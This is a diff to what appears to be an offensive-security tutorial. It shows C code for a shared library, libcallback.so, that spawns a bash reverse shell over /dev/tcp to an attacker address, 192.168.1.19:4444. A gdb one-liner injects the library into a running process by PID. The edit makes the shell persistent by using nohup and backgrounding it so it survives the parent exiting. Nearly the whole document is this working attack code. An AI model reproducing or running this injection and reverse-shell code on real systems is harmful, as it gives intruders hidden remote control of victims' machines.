@@ -96,13 +96,12 @@ The attacker IP in this example is 192.168.1.19 and will be listening on port 44
    cp ./libcallback.so /tmp/libcallback.so
 */
 
-// callback retry interval and reverse shell destination
-#define WAITSEC  120
+// callback reverse shell destination
 #define RVSADDR "192.168.1.19"
 #define RVSPORT "4444"
 
 // reverse shell command
-#define COMMAND "echo 'exec >&/dev/tcp/" RVSADDR "/" RVSPORT "; exec 0>&1' | /bin/bash"
+#define COMMAND "echo 'exec >& /dev/tcp/" RVSADDR "/" RVSPORT " 0>&1' | nohup /bin/bash >/dev/null 2>&1 &"
 
 void *callback(void *a);
 
@@ -125,11 +124,7 @@ void start_callbacks()
 
 void *callback(void *a)
 {
-   while(1)
-   {
-      system(COMMAND);
-      sleep(WAITSEC);
-   }
+   system(COMMAND);
    return NULL;
 }
 ```
@@ -140,4 +135,4 @@ void *callback(void *a)
 (e.g. PID selected is 2739)<br />
 `echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`
 
-You should see a connection to your netcat session listening on port 4444.
+You should see a connection to your netcat session listening on port 4444.  You should not lose your shell even if the parent process exits.
